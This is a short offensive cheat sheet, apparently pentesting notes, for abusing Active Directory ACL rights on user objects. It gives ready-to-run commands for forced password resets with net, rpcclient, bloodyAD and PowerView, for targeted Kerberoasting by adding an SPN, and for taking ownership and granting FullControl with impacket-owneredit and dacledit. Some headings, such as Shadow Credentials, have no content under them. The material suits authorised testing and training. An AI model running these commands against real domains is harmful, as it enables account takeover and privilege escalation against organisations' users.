# ACLs/ACEs permissions on User

### ForceChangePassword

    net user USER PASSWORD /domain (Windows)

    net rpc password USER PASSWORD -S DC_FQDN (Linux)

### GenericAll / GenericWrite

#### 1) Windows net command

Change the password of a user

    net user USER PASSWORD /domain

#### 2) Linux Net RPC - Samba 

    net rpc password TARGET_USER 'Password@987' -U domain.local/USER1%'Password@1' -S DC_IP   

#### 3) BloodyAD

    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" set password "TARGET_USER" "Password@9876"

#### 4) Rpcclient

    rpcclient -U domain.local/USER1 DC_IP
    rpcclient $> setuserinfo TARGET_USER 23 "Password@9876"

#### 5) Targeted Kerberoasting (add SPN)

    targetedKerberoast.py -d DOMAIN -u USER -p PASS (TGS Hash)

 ### Alternate method: Powerview

#### 1) Enumerate interesting ACLs with powerview

    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "OUR_USER"} 

#### Then:

    Set-DomainObject -Identity TARGET_USER -SET @(serviceprincipalname='nonexistent/WHATEVER') (Powerview)

    Get-DomainSPNTicket -SPN nonexistent/WHATEVER (Powerview)

#### 6) Logon Script (Access)

#### 7) add Key Credentials (Shadow Credentials)

#### 8) Powerview

    $SecPassword = ConvertTo-SecureString 'Password@987' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('domain.local\TARGET_USER', $SecPassword)

#### 9) Windows PowerShell

    $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword

### AllExtendedRights

#### 1) Linux Net RPC - Samba

    net rpc password TARGET_USER 'Password@987' -U domain.local/USER1%'Password@1' -S DC_IP

#### 2) BloodyAD

    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" set password "TARGET_USER" "Password@987"

#### 3) Rpcclient

    rpcclient -U domain.local/USER1 DC_IP
    rpcclient $> setuserinfo TARGET_USER 23 Ignite@987

#### 4) Powerview

    powershell -ep bypass
    Import-Module .\PowerView.ps1
    $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
    Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword

### WriteOwner

#### 1) impacket-owneredit

Grant Ownership (owneredit), then assign Full Control (dacledit), then perform Kerberoasting or Password Change attacks.

    impacket-owneredit -action write -new-owner 'USER1' -target-dn 'CN=TARGET_USER,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP

#### 2) impacket-dacledit

    impacket-dacledit -action 'write' -rights 'FullControl' -principal 'USER1' -target-dn 'CN=TARGET_USER,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP
